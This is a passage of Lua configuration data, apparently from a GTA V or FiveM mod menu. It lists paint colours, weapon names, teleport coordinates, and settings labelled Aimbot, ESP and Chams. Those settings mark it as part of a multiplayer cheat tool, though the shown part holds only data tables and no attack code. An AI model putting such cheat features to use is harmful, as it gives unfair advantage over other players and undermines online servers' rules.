                    'Metallic Candy Red', 'Metallic Sunrise Orange',
                    'Metallic Classic Gold', 'Metallic Orange',
                    'Metallic Dark Green', 'Metallic Racing Green',
                    'Metallic Sea Green', 'Metallic Olive Green',
                    'Metallic Green', 'Metallic Gasoline Blue Green',
                    'Metallic Midnight Blue', 'Metallic Dark Blue',
                    'Metallic Saxony Blue', 'Metallic Blue',
                    'Metallic Mariner Blue', 'Metallic Harbor Blue',
                    'Metallic Diamond Blue', 'Metallic Surf Blue',
                    'Metallic Nautical Blue', 'Metallic Bright Blue',
                    'Metallic Purple Blue', 'Metallic Spinnaker Blue',
                    'Metallic Ultra Blue', 'Metallic Bright Blue',
                    'Metallic Taxi Yellow', 'Metallic Race Yellow',
                    'Metallic Bronze', 'Metallic Yellow Bird', 'Metallic Lime',
                    'Metallic Champagne', 'Metallic Pueblo Beige',
                    'Metallic Dark Ivory', 'Metallic Choco Brown',
                    'Metallic Golden Brown', 'Metallic Light Brown',
                    'Metallic Straw Beige', 'Metallic Moss Brown',
                    'Metallic Biston Brown', 'Metallic Beechwood',
                    'Metallic Dark Beechwood', 'Metallic Choco Orange',
                    'Metallic Beach Sand', 'Metallic Sun Bleeched Sand',
                    'Metallic Cream', 'Metallic White', 'Metallic Frost White',
                    'Metallic Securicor Green', 'Metallic Vermillion Pink',
                    'Mettalic Black Blue', 'Metallic Black Purple',
                    'Metallic Black Red', 'Metallic Purple', 'Metallic Lava Red'
                },
                MatteIDS = {
                    12, 13, 14, 39, 40, 41, 42, 55, 82, 83, 84, 128, 129, 131,
                    148, 149, 151, 152, 153, 154, 155
                },
                MatteLBLS = {
                    'Matte Black', 'Matte Gray', 'Matte Light Grey',
                    'Matte Red', 'Matte Dark Red', 'Matte Orange',
                    'Matte Yellow', 'Matte Lime Green', 'Matte Dark Blue',
                    'Matte Blue', 'Matte Midnight Blue', 'Matte Green',
                    'Matte Brown', 'Matte White', 'Matte Purple',
                    'Matte Dark Purple', 'Matte Forest Green',
                    'Matte Olive Drab', 'Matte Desert Brown',
                    'Matte Desert Tan', 'Matte Foilage Green'
                },
                UtilIDS = {
                    15, 16, 17, 18, 19, 20, 43, 44, 45, 56, 57, 75, 76, 77, 78,
                    79, 80, 81, 108, 109, 110, 122
                },
                UtilLBLS = {
                    'Util Black', 'Util Black Poly', 'Util Dark silver',
                    'Util Silver', 'Util Gun Metal', 'Util Shadow Silver',
                    'Util Red', 'Util Bright Red', 'Util Garnet Red',
                    'Util Dark Green', 'Util Green', 'Util Dark Blue',
                    'Util Midnight Blue', 'Util Blue', 'Util Sea Foam Blue',
                    'Util Lightning blue', 'Util Maui Blue Poly',
                    'Util Bright Blue', 'Util Brown', 'Util Medium Brown',
                    'Util Light Brown', 'Util Off White'
                },
                WornIDS = {
                    21, 22, 23, 24, 25, 26, 46, 47, 48, 58, 59, 60, 85, 86, 87,
                    113, 114, 115, 116, 121, 123, 124, 126, 130, 132, 133
                },
                WornLBLS = {
                    'Worn Black', 'Worn Graphite', 'Worn Silver Grey',
                    'Worn Silver', 'Worn Blue Silver', 'Worn Shadow Silver',
                    'Worn Red', 'Worn Golden Red', 'Worn Dark Red',
                    'Worn Dark Green', 'Worn Green', 'Worn Sea Wash',
                    'Worn Dark blue', 'Worn Blue', 'Worn Light blue',
                    'Worn Honey Beige', 'Worn Brown', 'Worn Dark Brown',
                    'Worn straw beige', 'Worn Off White', 'Worn Orange',
                    'Worn Light Orange', 'Worn Taxi Yellow', 'Worn Orange',
                    'Worn White', 'Worn Olive Army Green'
                },
                OthersIDS = {
                    117, 118, 119, 120, 127, 134, 135, 136, 138, 139, 140, 141,
                    144, 146, 147, 156, 157, 158, 159
                },
                OthersLBLS = {
                    'Brushed Steel', 'Brushed Black steel', 'Brushed Aluminium',
                    'Chrome', 'police car blue', 'Pure White', 'Hot Pink',
                    'Salmon pink', 'Orange', 'Green', 'Blue',
                    'Mettalic Black Blue', 'hunter green',
                    'Metaillic V Dark Blue', 'MODSHOP BLACK1',
                    'DEFAULT ALLOY COLOR', 'Epsilon Blue', 'Pure Gold',
                    'Brushed Gold'
                }
            },
            LSCSavedVehicle = 0
        },
        HandlingVehicle = 0,
        AutoPilot = {Style = 786603, IsDriving = false},
        WeapList = {
            Melee = {
                labels = {
                    'Cavaliary dagger', 'Bat', 'Bottle', 'Crowbar',
                    'Flashlight', 'Golf club', 'Hammer', 'Hatchet', 'Knuckle',
                    'Knife', 'Machete', 'Switchblade', 'Nightstick', 'Wrench',
                    'Battle axe', 'Pool cue'
                },
                names = {
                    'weapon_dagger', 'weapon_bat', 'weapon_bottle',
                    'weapon_crowbar', 'weapon_flashlight', 'weapon_golfclub',
                    'weapon_hammer', 'weapon_hatchet', 'weapon_knuckle',
                    'weapon_knife', 'weapon_machete', 'weapon_switchblade',
                    'weapon_nightstick', 'weapon_wrench', 'weapon_battleaxe',
                    'weapon_poolcue'
                }
            },
            Handguns = {
                labels = {
                    'Pistol', 'Pistol MK2', 'Combat pistol', 'AP Pistol',
                    'Stungun', 'Pistol .50', 'SNS Pistol', 'SNS Pistol MK2',
                    'Heavy pistol', 'Vintage pistol', 'Flare gun',
                    'Marksman pistol', 'Revolver', 'Revolver MK2',
                    'Double action revolver', 'Ray Pistol', 'Ceramic pistol'
                },
                names = {
                    'weapon_pistol', 'weapon_pistol_mk2', 'weapon_combatpistol',
                    'weapon_appistol', 'weapon_stungun', 'weapon_pistol50',
                    'weapon_snspistol', 'weapon_snspistol_mk2',
                    'weapon_heavypistol', 'weapon_vintagepistol',
                    'weapon_flaregun', 'weapon_marksmanpistol',
                    'weapon_revolver', 'weapon_revolver_mk2',
                    'weapon_doubleaction', 'weapon_raypistol',
                    'weapon_ceramicpistol'
                }
            },
            Smgs = {
                labels = {
                    'Micro SMG', 'SMG', 'SMG MK2', 'Assault SMG', 'Combat PDW',
                    'Machine Pistol', 'Mini SMG', 'Unholy Hellbringer'
                },
                names = {
                    'weapon_microsmg', 'weapon_smg', 'weapon_smg_mk2',
                    'weapon_assaultsmg', 'weapon_combatpdw',
                    'weapon_machinepistol', 'weapon_minismg',
                    'weapon_raycarbine'
                }
            },
            Shotguns = {
                labels = {
                    'Pump shotgun', 'Pump shotgun MK2', 'Sawed-off shotgun',
                    'Assault shotgun', 'Bullpup shotgun', 'Musket',
                    'Heavy shotgun', 'Double barrel shotgun', 'Auto shotgun'
                },
                names = {
                    'weapon_pumpshotgun', 'weapon_pumpshotgun_mk2',
                    'weapon_sawnoffshotgun', 'weapon_assaultshotgun',
                    'weapon_bullpupshotgun', 'weapon_musket',
                    'weapon_heavyshotgun', 'weapon_dbshotgun',
                    'weapon_autoshotgun'
                }
            },
            Assaultrifles = {
                labels = {
                    'Assault Rifle', 'Assault Rifle MK2', 'Carbine Rifle',
                    'Carbine Rifle MK2', 'Advanced Rifle', 'Special carbine',
                    'Special Carbine MK2', 'Bullpup Rifle', 'Bullpup Rifle MK2',
                    'Compact Rifle'
                },
                names = {
                    'weapon_assaultrifle', 'weapon_assaultrifle_mk2',
                    'weapon_carbinerifle', 'weapon_carbinerifle_mk2',
                    'weapon_advancedrifle', 'weapon_specialcarbine',
                    'weapon_specialcarbine_mk2', 'weapon_bullpuprifle',
                    'weapon_bullpuprifle_mk2', 'weapon_compactrifle'
                }
            },
            Lmg = {
                labels = {'MG', 'Combat MG', 'Combat MG MK2', 'Gusenberg'},
                names = {
                    'weapon_mg', 'weapon_combatmg', 'weapon_combatmg_mk2',
                    'weapon_gusenberg'
                }
            },
            Sniperrifles = {
                labels = {
                    'Sniper Rifle', 'Heavy sniper', 'Heavy Sniper MK2',
                    'Marksman Rifle', 'Marksman Rifle MK2'
                },
                names = {
                    'weapon_sniperrifle', 'weapon_heavysniper',
                    'weapon_heavysniper_mk2', 'weapon_marksmanrifle',
                    'weapon_marksmanrifle_mk2'
                }
            },
            Heavy = {
                labels = {
                    'RPG', 'Grenade launcher', 'Smoke Launcher', 'Minigun',
                    'Firework launcher', 'Railgun', 'Homing launcher',
                    'Compact launcher', 'Ray minigun'
                },
                names = {
                    'weapon_rpg', 'weapon_grenadelauncher',
                    'weapon_grenadelauncher_smoke', 'weapon_minigun',
                    'weapon_firework', 'weapon_railgun',
                    'weapon_hominglauncher', 'weapon_compactlauncher',
                    'weapon_rayminigun'
                }
            },
            Throwables = {
                labels = {
                    'Grenade', 'BZ Gas', 'Molotov', 'C4', 'Proxy mine',
                    'Snowball', 'Pipebomb', 'Ball', 'Smoke Grenade', 'Flare'
                },
                names = {
                    'weapon_grenade', 'weapon_bzgas', 'weapon_molotov',
                    'weapon_stickybomb', 'weapon_proxmine', 'weapon_snowball',
                    'weapon_pipebomb', 'weapon_ball', 'weapon_smokegrenade',
                    'weapon_flare'
                }
            },
            Misc = {
                labels = {
                    'Petrol can', 'Parachute', 'Fire extinguisher', 'Hazard can'
                },
                names = {
                    'weapon_petrolcan', 'gadget_parachute',
                    'weapon_fireextinguisher', 'weapon_hazardcan'
                }
            }
        },
        Aimbot = {
            Res = {W = 0.11, H = 0.11 * b.GetAspectRatio()},
            TargetBone = 31086,
            Friends = {},
            BoneList = {
                31086, 24817, 64729, 10706, 0, 18905, 57005, 63931, 36864,
                14201, 52301
            },
            DrawAtInfo = {
                [1] = {0.0, -0.1362, 204, 0, 0},
                [2] = {0.0, -0.1, 255, 51, 0},
                [3] = {-0.01, -0.098, 255, 77, 0},
                [4] = {0.01, -0.098, 255, 77, 0},
                [5] = {0.0, 0.0, 255, 77, 0},
                [6] = {-0.03, 0.0, 0, 255, 0},
                [7] = {0.03, 0.0, 0, 255, 0},
                [8] = {-0.013, 0.07, 255, 213, 0},
                [9] = {0.017, 0.07, 255, 213, 0},
                [10] = {-0.013, 0.12, 0, 255, 0},
                [11] = {0.02, 0.13, 0, 255, 0}
            }
        },
        SavedPoints = {
            Bunkers = {
                {
                    label = 'Zancudo',
                    loc = c._vector3(-3058.714, 3329.19, 12.5844)
                },
                {
                    label = 'Route68',
                    loc = c._vector3(24.43542, 2959.705, 58.35517)
                },
                {
                    label = 'Oilfields',
                    loc = c._vector3(481.0465, 2995.135, 43.96672)
                },
                {
                    label = 'Desert',
                    loc = c._vector3(848.6175, 2996.567, 45.81612)
                },
                {
                    label = 'Smoke tree',
                    loc = c._vector3(2126.785, 3335.04, 48.21422)
                },
                {
                    label = 'Scrapyard',
                    loc = c._vector3(2493.654, 3140.399, 51.28789)
                },
                {
                    label = 'Grapeseed',
                    loc = c._vector3(1823.961, 4708.14, 42.4991)
                },
                {
                    label = 'Palleto',
                    loc = c._vector3(-783.0755, 5934.686, 24.31475)
                },
                {
                    label = 'Route1',
                    loc = c._vector3(-3180.466, 1374.192, 19.9597)
                },
                {
                    label = 'Farmhouse',
                    loc = c._vector3(1570.372, 2254.549, 78.89397)
                },
                {
                    label = 'Raton canyon',
                    loc = c._vector3(-391.3216, 4363.728, 58.65862)
                }
            },
            Apartments = {
                {
                    label = 'Modern 1 apartment',
                    loc = c._vector3(-786.8663, 315.7642, 217.6385)
                },
                {
                    label = 'Modern 2 apartment',
                    loc = c._vector3(-786.9563, 315.6229, 187.9136)
                },
                {
                    label = 'Modern 3 apartment',
                    loc = c._vector3(-774.0126, 342.0428, 196.6864)
                },
                {
                    label = 'Mody 1 apartment',
                    loc = c._vector3(-787.0749, 315.8198, 217.6386)
                },
                {
                    label = 'Mody 2 apartment',
                    loc = c._vector3(-786.8195, 315.5634, 187.9137)
                },
                {
                    label = 'Mody 3 apartment',
                    loc = c._vector3(-774.1382, 342.0316, 196.6864)
                }, {
                    label = 'Vibrant 1 apartment',
                    loc = c._vector3(-786.6245, 315.6175, 217.6385)
                }, {
                    label = 'Vibrant 2 apartment',
                    loc = c._vector3(-786.9584, 315.7974, 187.9135)
                }, {
                    label = 'Vibrant 3 apartment',
                    loc = c._vector3(-774.0223, 342.1718, 196.6863)
                },
                {
                    label = 'Sharp 1 apartment',
                    loc = c._vector3(-787.0902, 315.7039, 217.6384)
                },
                {
                    label = 'Sharp 2 apartment',
                    loc = c._vector3(-787.0155, 315.7071, 187.9135)
                },
                {
                    label = 'Sharp 3 apartment',
                    loc = c._vector3(-773.8976, 342.1525, 196.6863)
                }, {
                    label = 'Monochrome 1 apartment',
                    loc = c._vector3(-786.9887, 315.7393, 217.6386)
                }, {
                    label = 'Monochrome 2 apartment',
                    loc = c._vector3(-786.8809, 315.6634, 187.9136)
                }, {
                    label = 'Monochrome 3 apartment',
                    loc = c._vector3(-774.0675, 342.0773, 196.6864)
                }, {
                    label = 'Seductive 1 apartment',
                    loc = c._vector3(-787.1423, 315.6943, 217.6384)
                }, {
                    label = 'Seductive 2 apartment',
                    loc = c._vector3(-787.0961, 315.815, 187.9135)
                }, {
                    label = 'Seductive 3 apartment',
                    loc = c._vector3(-773.9552, 341.9892, 196.6862)
                },
                {
                    label = 'Regal 1 apartment',
                    loc = c._vector3(-787.029, 315.7113, 217.6385)
                },
                {
                    label = 'Regal 2 apartment',
                    loc = c._vector3(-787.0574, 315.6567, 187.9135)
                },
                {
                    label = 'Regal 3 apartment',
                    loc = c._vector3(-774.0109, 342.0965, 196.6863)
                },
                {
                    label = 'Aqua 1 apartment',
                    loc = c._vector3(-786.9469, 315.5655, 217.6383)
                },
                {
                    label = 'Aqua 2 apartment',
                    loc = c._vector3(-786.9756, 315.723, 187.9134)
                },
                {
                    label = 'Aqua 3 apartment',
                    loc = c._vector3(-774.0349, 342.0296, 196.6862)
                },
                {
                    label = 'Low end apartment',
                    loc = c._vector3(261.4586, -998.8196, -99.00863)
                }, {
                    label = 'Medium end apartment',
                    loc = c._vector3(347.2686, -999.2955, -99.19622)
                }, {
                    label = '4 integrity way, apt 28',
                    loc = c._vector3(-18.07856, -583.6725, 79.46569)
                }, {
                    label = '4 integrity way, apt 30',
                    loc = c._vector3(-35.31277, -580.4199, 88.71221)
                }, {
                    label = 'Dell perro heights, apt 4',
                    loc = c._vector3(-1468.14, -541.815, 73.4442)
                }, {
                    label = 'Dell perro heights, apt 7',
                    loc = c._vector3(-1477.14, -538.7499, 55.5264)
                }, {
                    label = 'Richard majestic, apt 2',
                    loc = c._vector3(-915.811, -379.432, 113.6748)
                },
                {
                    label = 'Tinsel towers, apt 42',
                    loc = c._vector3(-614.86, 40.6783, 97.60007)
                },
                {
                    label = 'Eclipse towers, apt 3',
                    loc = c._vector3(-773.407, 341.766, 211.397)
                }, {
                    label = '3655 wild oats drive',
                    loc = c._vector3(-169.286, 486.4938, 137.4436)
                }, {
                    label = '2044 north conker avenue',
                    loc = c._vector3(340.9412, 437.1798, 149.3925)
                }, {
                    label = '2045 north conker avenue',
                    loc = c._vector3(373.023, 416.105, 145.7006)
                }, {
                    label = '2862 hillcrest avenue',
                    loc = c._vector3(-676.127, 588.612, 145.1698)
                }, {
                    label = '2868 hillcrest avenue',
                    loc = c._vector3(-763.107, 615.906, 144.1401)
                }, {
                    label = '2874 hillcrest avenue',
                    loc = c._vector3(-857.798, 682.563, 152.6529)
                },
                {
                    label = '2677 whispymound drive',
                    loc = c._vector3(120.5, 549.952, 184.097)
                },
                {
                    label = '2133 mad wayne thunder',
                    loc = c._vector3(-1288, 440.748, 97.69459)
                }
            },
            Arcades = {
                {
                    label = 'Executive rich',
                    loc = c._vector3(-141.1987, -620.913, 168.8205)
                },
                {
                    label = 'Executive cool',
                    loc = c._vector3(-141.5429, -620.9524, 168.8204)
                }, {
                    label = 'Executive contrast',
                    loc = c._vector3(-141.2896, -620.9618, 168.8204)
                },
                {
                    label = 'Old spice warm',
                    loc = c._vector3(-141.4966, -620.8292, 168.8204)
                }, {
                    label = 'Old spice classical',
                    loc = c._vector3(-141.3997, -620.9006, 168.8204)
                },
                {
                    label = 'Old spice Vintage',
                    loc = c._vector3(-141.5361, -620.9186, 168.8204)
                },
                {
                    label = 'Power broker ice',
                    loc = c._vector3(-141.392, -621.0451, 168.8204)
                }, {
                    label = 'Power broker Conservative',
                    loc = c._vector3(-141.1945, -620.8729, 168.8204)
                }, {
                    label = 'Power broker Polished',
                    loc = c._vector3(-141.4924, -621.0035, 168.8205)
                },
                {
                    label = 'Garage 1',
                    loc = c._vector3(-191.0133, -579.1428, 135.0000)
                },
                {
                    label = 'Garage 2',
                    loc = c._vector3(-117.4989, -568.1132, 135.0000)
                },
                {
                    label = 'Garage 3',
                    loc = c._vector3(-136.0780, -630.1852, 135.0000)
                },
                {
                    label = 'Mod shop',
                    loc = c._vector3(-146.6166, -596.6301, 166.0000)
                }
            },
            MissionInterios = {
                {
                    label = 'Cargo ship',
                    loc = c._vector3(-163.3628, -2385.161, 5.999994)
                },
                {
                    label = 'Red carpet',
                    loc = c._vector3(300.5927, 300.5927, 104.3776)
                }, {
                    label = 'Rekt stilthouse destroyed',
                    loc = c._vector3(-1020.518, 663.27, 153.5167)
                }, {
                    label = 'Rekt stilthouse rebuild',
                    loc = c._vector3(-1020.518, 663.27, 153.5167)
                },
                {
                    label = 'Union depository',
                    loc = c._vector3(2.6968, -667.0166, 16.13061)
                }, {
                    label = 'Trevors trailer dirty',
                    loc = c._vector3(1975.552, 3820.538, 33.44833)
                }, {
                    label = 'Trevors trailer clean',
                    loc = c._vector3(1975.552, 3820.538, 33.44833)
                },
                {
                    label = 'Stadium',
                    loc = c._vector3(-248.6731, -2010.603, 30.14562)
                },
                {
                    label = 'Max renda shop',
                    loc = c._vector3(-585.8247, -282.72, 35.45475)
                },
                {
                    label = 'Jewerly',
                    loc = c._vector3(-630.07, -236.332, 38.05704)
                },
                {label = 'FBI lobby', loc = c._vector3(110.4, -744.2, 45.7496)},
                {
                    label = 'Gunrunning heist yacht',
                    loc = c._vector3(1373.828, 6737.393, 6.707596)
                }, {
                    label = 'Dignity heist yacht',
                    loc = c._vector3(-2027.946, -1036.695, 6.707587)
                }, {
                    label = 'Dignity party yacht',
                    loc = c._vector3(-2023.643, -1038.119, 5.576781)
                },
                {
                    label = 'Navy boat',
                    loc = c._vector3(3084.73, -4770.709, 15.26167)
                },
                {
                    label = 'Bridge train crash',
                    loc = c._vector3(532.1309, 4526.187, 89.79387)
                },
                {
                    label = 'North yankton',
                    loc = c._vector3(3217.697, -4834.826, 111.8152)
                },
                {
                    label = 'Oneil Farm 2',
                    loc = c._vector3(2469.03, 4955.278, 45.11892)
                },
                {label = 'Morgue', loc = c._vector3(275.446, -1361.11, 24.5378)}
            },
            Clubs = {
                {
                    label = 'Clubhouse 1',
                    loc = c._vector3(1107.04, -3157.399, -37.51859)
                },
                {
                    label = 'Clubhouse 2',
                    loc = c._vector3(998.4809, -3164.711, -38.90733)
                },
                {
                    label = 'Meth lab',
                    loc = c._vector3(1009.5, -3196.6, -38.99682)
                },
                {
                    label = 'Weed farm',
                    loc = c._vector3(1051.491, -3196.536, -39.14842)
                },
                {
                    label = 'Cocaine lockup',
                    loc = c._vector3(1093.6, -3196.6, -38.99841)
                }, {
                    label = 'Counterfeit cash factory',
                    loc = c._vector3(1121.897, -3195.338, -40.4025)
                },
                {
                    label = 'Document forgery office',
                    loc = c._vector3(1165, -3196.6, -39.01306)
                },
                {
                    label = 'Warehouse small',
                    loc = c._vector3(1094.988, -3101.776, -39.00363)
                },
                {
                    label = 'Warehouse medium',
                    loc = c._vector3(1056.486, -3105.724, -39.00439)
                },
                {
                    label = 'Warehouse large',
                    loc = c._vector3(1006.967, -3102.079, -39.0035)
                },
                {
                    label = 'Vehicle warehouse',
                    loc = c._vector3(994.5925, -3002.594, -39.64699)
                },
                {
                    label = 'Lost MC clubhouse',
                    loc = c._vector3(982.0083, -100.8747, 74.84512)
                }
            },
            GameInteriors = {
                {
                    label = 'Bunker interior',
                    loc = vector3(899.5518, -3246.038, -98.04907)
                },
                {
                    label = 'Charcreator',
                    loc = vector3(402.5164, -1002.847, -99.2587)
                },
                {
                    label = 'Mission carpark',
                    loc = vector3(405.9228, -954.1149, -99.6627)
                },
                {
                    label = 'Torture room',
                    loc = vector3(136.5146, -2203.149, 7.30914)
                },
                {
                    label = 'Solomon\'s office',
                    loc = vector3(-1005.84, -478.92, 50.02733)
                }, {
                    label = 'Psychiatrist\'s office',
                    loc = vector3(-1908.024, -573.4244, 19.09722)
                },
                {
                    label = 'Omega\'s garage',
                    loc = vector3(2331.344, 2574.073, 46.68137)
                },
                {
                    label = 'Movie theatre',
                    loc = vector3(-1427.299, -245.1012, 16.8039)
                },
                {label = 'Motel', loc = vector3(152.2605, -1004.471, -98.99999)},
                {label = 'Madrazos ranch', loc = vector3(1399, 1150, 115)},
                {
                    label = 'Life invader office',
                    loc = vector3(-1044.193, -236.9535, 37.96496)
                },
                {
                    label = 'Lester\'s house',
                    loc = vector3(1273.9, -1719.305, 54.77141)
                },
                {
                    label = 'Fbi top floor',
                    loc = vector3(134.5835, -749.339, 258.152)
                },
                {
                    label = 'Fbi floor 47',
                    loc = vector3(134.5835, -766.486, 234.152)
                },
                {
                    label = 'Fbi floor 49',
                    loc = vector3(134.635, -765.831, 242.152)
                },
                {
                    label = 'Iaa office',
                    loc = vector3(117.22, -620.938, 206.1398)
                }, {
                    label = 'Smuggler\'s run hangar',
                    loc = vector3(-1266.802, -3014.837, -49.000)
                },
                {
                    label = 'Avenger interior',
                    loc = vector3(520.0, 4750.0, -70.0)
                },
                {
                    label = 'Facility',
                    loc = vector3(345.0041, 4842.001, -59.9997)
                },
                {label = 'Server farm', loc = vector3(2168.0, 2920.0, -84.0)},
                {label = 'Submarine', loc = vector3(514.33, 4886.18, -62.59)},
                {label = 'Iaa facility', loc = vector3(2147.91, 2921.0, -61.9)},
                {
                    label = 'Nightclub',
                    loc = vector3(-1604.664, -3012.583, -78.000)
                },
                {
                    label = 'Nightclub warehouse',
                    loc = vector3(-1505.783, -3012.587, -80.000)
                },
                {
                    label = 'Terrorbyte interior',
                    loc = vector3(-1421.015, -3012.587, -80.000)
                }
            },
            Clothing = {
                {label = 'Paleto', loc = c._vector3(-4.5, 6521.2, 30.5)},
                {label = 'Paleto Bay', loc = c._vector3(-4.5, 6521.2, 30.5)},
                {label = 'Zancudo', loc = c._vector3(1678.05, 4819.88, 41.29)},
                {
                    label = 'Sandy Shores',
                    loc = c._vector3(1179.67, 2691.37, 15.4)
                },
                {
                    label = 'Strawberry',
                    loc = c._vector3(89.320786, -1392.317627, 30.4)
                },
                {
                    label = 'Great Chaparral',
                    loc = c._vector3(-1089.4, 2697.03, 19.44)
                },
                {
                    label = 'Havick ',
                    loc = c._vector3(134.122055, -200.21133, 53.864090)
                },
                {
                    label = 'Del Perro ',
                    loc = c._vector3(-1210.620361, -784.16021, 16.549015)
                },
                {
                    label = 'Burton ',
                    loc = c._vector3(-148.234741, -308.07, 38.104)
                },
                {
                    label = 'Rockford Hills ',
                    loc = c._vector3(-725.551453, -162.83371, 36.570)
                },
                {
                    label = 'MorningWood ',
                    loc = c._vector3(-1460.654, -227.55, 48.72)
                }
            },
            BarberShops = {
                {label = 'Havick', loc = c._vector3(-27.79, -136.86, 56.51)},
                {
                    label = 'Rockford Hills',
                    loc = c._vector3(-829.42, -191.58, 36.92)
                },
                {label = 'Vespucci', loc = c._vector3(-1294.99, -1117.64, 6.15)},
                {
                    label = 'Mirror Park',
                    loc = c._vector3(1198.02, -471.81, 65.67)
                }, {label = 'Davis', loc = c._vector3(127.76, -1718.65, 28.65)},
                {
                    label = 'Paleto Bay',
                    loc = c._vector3(-286.63, 6239.38, 30.56)
                },
                {
                    label = 'Sandy Shores',
                    loc = c._vector3(1938.35, 3717.80, 31.60)
                }
            },
            Garages = {
                {
                    label = 'Mort Mutual Insurance',
                    loc = c._vector3(-221.74, -1158.24, 23.04)
                },
                {
                    label = 'Bennys Garage',
                    loc = c._vector3(-196.34, -1303.10, 30.65)
                },
                {
                    label = 'Beekers Garage',
                    loc = c._vector3(116.22, 6606.20, 31.46)
                },
                {
                    label = 'Sandy Shores',
                    loc = c._vector3(1176.82, 2657.97, 37.37)
                },
                {
                    label = 'Grand Senora Dust',
                    loc = c._vector3(1173.45, 2661.58, 37.28)
                },
                {label = 'Burton', loc = c._vector3(-370.53, -130.40, 38.19)},
                {
                    label = 'Little Seoul Car Wash',
                    loc = c._vector3(-701.82, -921.92, 18.58)
                }
            },
            Ammunation = {
                {
                    label = 'Paleto Bay',
                    loc = c._vector3(-318.85, 6074.43, 30.614)
                },
                {
                    label = 'Sandy Shores',
                    loc = c._vector3(1704.67, 3748.88, 33.28)
                },
                {
                    label = 'Great Chaparral',
                    loc = c._vector3(-1108.60, 2685.69, 18.17)
                }, {label = 'Hawick', loc = c._vector3(235.66, -42.26, 69.22)},
                {
                    label = 'Morningwood',
                    loc = c._vector3(-1328.592896, -387.114410, 36.126881)
                },
                {
                    label = 'Little Seoul',
                    loc = c._vector3(-665.232727, -952.522522, 20.866556)
                },
                {
                    label = 'La Mesa',
                    loc = c._vector3(844.439026, -1009.422424, 27.511728)
                },
                {
                    label = 'Pillbox Hill',
                    loc = c._vector3(17.377790, -1122.183105, 28.469843)
                }
            }
        },
        Visuals = {ESP = 10},
        Chams = {
            target = 1,
            sets = {
                'uppr', 'jbib', 'lowr', 'accs', 'feet', 'berd', 'task', 'teef',
                'head'
            },
            sufixes = {
                ['upper'] = {
                    '000', '001', '002', '003', '004', '005', '006', '007',
                    '008', '009', '010', '011', '012', '013', '014', '015',
                    '016', '017', '018', '019', '020', '021', '022', '023',
                    '024', '025', '026', '027', '028', '029', '030', '031',
                    '032', '033', '034', '035', '036', '037', '038', '039',
                    '040', '041', '042', '043', '044', '045', '046', '047',
                    '048', '049', '050', '051', '052', '053', '054', '055',
                    '056', '057', '058', '059', '060', '061', '062', '063',
                    '064', '065', '066', '067', '068', '069', '070', '071',
                    '072', '073', '074', '075', '076', '077', '078', '079',
                    '080'
                },
                ['head'] = {
                    '000', '001', '002', '003', '004', '005', '006', '007',
                    '008', '009', '010', '011', '012', '013', '014', '015',
                    '016', '017', '018', '019', '020', '021', '022', '023',
                    '024', '025', '026', '027', '028', '029', '030', '031',
                    '032', '033', '034', '035', '036', '037', '038', '039',
                    '040', '041', '042', '043', '044', '045'
                },
                ['teef'] = {
                    '000', '001', '002', '003', '004', '005', '006', '007',
                    '008', '009', '010', '011', '012', '013', '014', '015',
                    '016', '017', '018', '019', '020', '021', '022', '023',
                    '024', '025', '026', '027', '028', '029', '030', '031',
                    '032', '033', '034', '035', '036', '037'
                },
                ['rest'] = {
                    '000', '001', '002', '003', '004', '005', '006', '007',
                    '008', '009', '010', '011', '012', '013', '014', '015',
                    '016', '017', '018', '019', '020', '021', '022', '023',
                    '024', '025', '026', '027', '028', '029'
                }
            },
            middlefixes = {
                ['casual'] = {
                    '_a_uni', '_b_uni', '_c_uni', '_d_uni', '_e_uni', '_f_uni',
                    '_g_uni', '_h_uni', '_i_uni', '_j_uni', '_k_uni', '_l_uni',
                    '_m_uni', '_n_uni', '_o_uni', '_p_uni', '_q_uni', '_r_uni',
                    '_s_uni', '_t_uni', '_u_uni', '_v_uni', '_w_uni', '_x_uni',
                    '_y_uni', '_z_uni', '_a_whi', '_b_whi', '_c_whi', '_d_whi',
                    '_e_whi', '_f_whi', '_g_whi', '_h_whi', '_i_whi', '_j_whi',
                    '_k_whi', '_l_whi', '_m_whi', '_n_whi', '_o_whi', '_p_whi',
                    '_q_whi', '_r_whi', '_s_whi', '_t_whi', '_u_whi', '_v_whi',
                    '_w_whi', '_x_whi', '_y_whi', '_z_whi'
                },
                ['head'] = {
                    '_a_uni', '_b_uni', '_c_uni', '_d_uni', '_e_uni', '_f_uni',
                    '_g_uni', '_h_uni', '_i_uni', '_j_uni', '_k_uni', '_l_uni',
                    '_m_uni', '_n_uni', '_o_uni', '_p_uni', '_q_uni', '_r_uni',
                    '_s_uni', '_t_uni', '_u_uni', '_v_uni', '_w_uni', '_x_uni',
                    '_y_uni', '_z_uni', '_a_whi', '_b_whi', '_c_whi', '_d_whi',
                    '_e_whi', '_f_whi', '_g_whi', '_h_whi', '_i_whi', '_j_whi',
                    '_k_whi', '_l_whi', '_m_whi', '_n_whi', '_o_whi', '_p_whi',
                    '_q_whi', '_r_whi', '_s_whi', '_t_whi', '_u_whi', '_v_whi',
                    '_w_whi', '_x_whi', '_y_whi', '_z_whi', '_a_bla', '_b_bla',
                    '_c_bla', '_d_bla', '_e_bla', '_f_bla', '_g_bla', '_h_bla',
                    '_i_bla', '_j_bla', '_k_bla', '_l_bla', '_m_bla', '_n_bla',
                    '_o_bla', '_p_bla', '_q_bla', '_r_bla', '_s_bla', '_t_bla',
                    '_u_bla', '_v_bla', '_w_bla', '_x_bla', '_y_bla', '_z_bla',
                    '_a_lat', '_b_lat', '_c_lat', '_d_lat', '_e_lat', '_f_lat',
                    '_g_lat', '_h_lat', '_i_lat', '_j_lat', '_k_lat', '_l_lat',
                    '_m_lat', '_n_lat', '_o_lat', '_p_lat', '_q_lat', '_r_lat',
                    '_s_lat', '_t_lat', '_u_lat', '_v_lat', '_w_lat', '_x_lat',
                    '_y_lat', '_z_lat', '_a_chi', '_b_chi', '_c_chi', '_d_chi',
                    '_e_chi', '_f_chi', '_g_chi', '_h_chi', '_i_chi', '_j_chi',
                    '_k_chi', '_l_chi', '_m_chi', '_n_chi', '_o_chi', '_p_chi',
                    '_q_chi', '_r_chi', '_s_chi', '_t_chi', '_u_chi', '_v_chi',
                    '_w_chi', '_x_chi', '_y_chi', '_z_chi', '_a_pak', '_b_pak',
                    '_c_pak', '_d_pak', '_e_pak', '_f_pak', '_g_pak', '_h_pak',
                    '_i_pak', '_j_pak', '_k_pak', '_l_pak', '_m_pak', '_n_pak',
                    '_o_pak', '_p_pak', '_q_pak', '_r_pak', '_s_pak', '_t_pak',
                    '_u_pak', '_v_pak', '_w_pak', '_x_pak', '_y_pak', '_z_pak',
